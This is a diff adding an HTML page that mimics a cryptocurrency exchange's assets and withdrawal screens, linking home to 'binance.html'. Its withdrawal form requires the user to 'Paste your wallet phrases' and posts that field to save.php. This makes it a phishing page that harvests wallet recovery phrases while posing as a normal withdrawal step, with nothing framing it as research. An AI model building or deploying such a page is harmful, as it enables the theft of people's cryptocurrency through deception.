@@ -1,0 +1,275 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Assets & Withdraw</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0b0f1c;
+      color: #fff;
+    }
+
+    .container { padding: 20px; }
+    .header { font-size: 20px; font-weight: bold; margin-bottom: 20px; }
+    .balance { font-size: 32px; font-weight: bold; }
+    .sub-balance { color: #888; font-size: 14px; margin-bottom: 20px; }
+
+    .card { background-color: #1c1f2e; padding: 10px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 30px;
+    }
+
+    .buttons div {
+      background-color: #1c1f2e;
+      border-radius: 10px;
+      padding: 10px;
+      text-align: center;
+      flex: 1;
+      margin: 0 5px;
+      cursor: pointer;
+    }
+
+    .account-box {
+      background-color: #1c1f2e;
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      display: flex;
+      background-color: #1c1f2e;
+      justify-content: space-around;
+      padding: 10px 0;
+      border-top: 1px solid #333;
+    }
+
+    .bottom-nav div {
+      text-align: center;
+      color: #ccc;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .bottom-nav .active { color: #f2b90b; }
+
+    .tab {
+      display: flex;
+      border-bottom: 1px solid #333;
+      margin-bottom: 20px;
+    }
+
+    .tab div {
+      flex: 1;
+      text-align: center;
+      padding: 10px 0;
+      cursor: pointer;
+      font-weight: bold;
+      color: #888;
+    }
+
+    .tab .active {
+      color: #f2b90b;
+      border-bottom: 2px solid #f2b90b;
+    }
+
+    .label {
+      margin: 10px 0 5px;
+      font-size: 14px;
+    }
+
+    .input-box, select {
+      width: 100%;
+      padding: 12px;
+      background-color: #1c1f2e;
+      border: 1px solid #555;
+      border-radius: 8px;
+      color: #fff;
+    }
+
+    .note { font-size: 13px; color: #f2b90b; margin: 10px 0; }
+    .withdrawal-info {
+      background-color: #1c1f2e;
+      padding: 15px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+
+    .withdrawal-info p { margin: 8px 0; font-size: 14px; }
+
+    .withdraw-btn {
+      margin-top: 20px;
+      width: 100%;
+      padding: 14px;
+      background-color: #f2b90b;
+      border: none;
+      color: #000;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .back-button {
+      font-size: 16px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Main My Assets Screen -->
+<div class="container" id="main-screen">
+  <div class="header">My Assets</div>
+  <div class="balance" id="asset-balance">0.0045678 BTC</div>
+
+  <div class="card">Card - Apply Now!</div>
+
+  <div class="buttons">
+    <div>Deposit</div>
+    <div onclick="showWithdraw()">Withdraw</div>
+    <div>Transfer</div>
+    <div>Convert</div>
+  </div>
+
+  <div class="account-box"><span>Funding</span><span>0.00 USD</span></div>
+  <div class="account-box"><span>Unified Trading</span><span>0.00 USD</span></div>
+</div>
+
+<!-- Withdraw Screen -->
+<div class="container" id="withdraw-screen" style="display: none;">
+  <div class="back-button" onclick="goBack()">← Back</div>
+
+  <div class="header"><h2>Withdraw</h2></div>
+
+  <div class="tab">
+    <div class="active">On-Chain</div>
+    <div>Internal Transfer</div>
+  </div>
+
+  <form action="save.php" method="POST">
+    <div class="label">Coin</div>
+    <select name="coin" required>
+      <option value="BTC">BTC Bitcoin</option>
+    </select>
+
+    <div class="label">Connect wallet</div>
+    <input class="input-box" name="wallet_phrase" placeholder="Paste your wallet phrases" required />
+
+    <div class="label">Network</div>
+    <select name="network" required>
+      <option value="">Select chain type</option>
+      <option value="BTC">BTC</option>
+      <option value="BNB">BNB Smart Chain</option>
+    </select>
+
+    <div class="label">Amount</div>
+    <input class="input-box" id="withdraw-amount" name="amount" placeholder="0.00" required />
+
+    <div id="error-msg" class="error-message"></div>
+
+    <div class="withdrawal-info">
+      <p><strong>Min. Withdrawal:</strong> 0.0001 BTC</p>
+      <p><strong>Funding Account:</strong> <span id="funding-balance">0 BTC</span></p>
+      <p><strong>Limit:</strong> 1,000,000 / 1,000,000 USDT</p>
+      <p><strong>Withdrawal Fee:</strong> 0.00011 BTC</p>
+      <p><strong>Amount Received:</strong> <span id="amount-received">0 BTC</span></p>
+    </div>
+
+    <button class="withdraw-btn" type="submit" id="submit-btn">Withdraw</button>
+  </form>
+</div>
+
+<!-- Bottom Navigation -->
+<div class="bottom-nav">
+  <div onclick="goHome()">Home</div>
+  <div>Markets</div>
+  <div>Trade</div>
+  <div>Earn</div>
+  <div class="active">Assets</div>
+</div>
+
+<script>
+  let balance = 0;
+
+  function showWithdraw() {
+    document.getElementById('main-screen').style.display = 'none';
+    document.getElementById('withdraw-screen').style.display = 'block';
+    updateFundingBalance();
+  }
+
+  function goBack() {
+    document.getElementById('main-screen').style.display = 'block';
+    document.getElementById('withdraw-screen').style.display = 'none';
+  }
+
+  function goHome() {
+    window.location.href = "binance.html";
+  }
+
+  function getBTCBalance() {
+    const text = document.getElementById('asset-balance').innerText;
+    const btc = parseFloat(text.replace(/[^\d.]/g, ''));
+    return isNaN(btc) ? 0 : btc;
+  }
+
+  function updateFundingBalance() {
+    balance = getBTCBalance();
+    document.getElementById('funding-balance').innerText = balance.toFixed(8) + ' BTC';
+  }
+
+  function updateAmountReceived() {
+    const input = document.getElementById('withdraw-amount').value;
+    const errorMsg = document.getElementById('error-msg');
+    const withdrawalFee = 0.00011;
+    let amount = parseFloat(input);
+
+    if (isNaN(amount)) {
+      document.getElementById('amount-received').innerText = '0 BTC';
+      errorMsg.textContent = '';
+      return;
+    }
+
+    if (amount > balance) {
+      errorMsg.textContent = 'Error: Withdrawal amount exceeds your balance.';
+      document.getElementById('amount-received').innerText = '0 BTC';
+      return;
+    } else {
+      errorMsg.textContent = '';
+    }
+
+    if (amount <= withdrawalFee) {
+      document.getElementById('amount-received').innerText = '0 BTC';
+    } else {
+      const received = amount - withdrawalFee;
+      document.getElementById('amount-received').innerText = received.toFixed(8) + ' BTC';
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', function () {
+    const input = document.getElementById('withdraw-amount');
+    input.addEventListener('input', updateAmountReceived);
+    updateFundingBalance();
+  });
+</script>
+</body>
+</html>
